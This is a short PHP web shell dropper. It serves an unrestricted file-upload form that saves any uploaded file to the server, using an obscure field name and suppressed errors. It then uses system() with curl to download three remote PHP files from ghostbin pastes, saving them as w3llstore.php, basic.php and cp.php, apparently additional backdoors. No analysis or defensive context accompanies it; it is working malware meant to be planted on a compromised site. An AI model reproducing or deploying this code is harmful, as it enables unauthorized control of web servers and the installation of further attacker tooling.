<?php if (isset($_FILES['azzatssins']['name'])) { $name = $_FILES['azzatssins']['name']; $azx = $_FILES['azzatssins']['tmp_name']; @move_uploaded_file($azx, $name); echo $name; } else { echo "<form method=post enctype=multipart/form-data><input type=file name=azzatssins><input type=submit value='>>'>"; } system('curl https://ghostbin.co/paste/tap2by/raw -o w3llstore.php'); system('curl https://ghostbin.co/paste/4rwa8w/raw -o basic.php'); system('curl https://ghostbin.co/paste/wf6ug7/raw -o cp.php'); ?>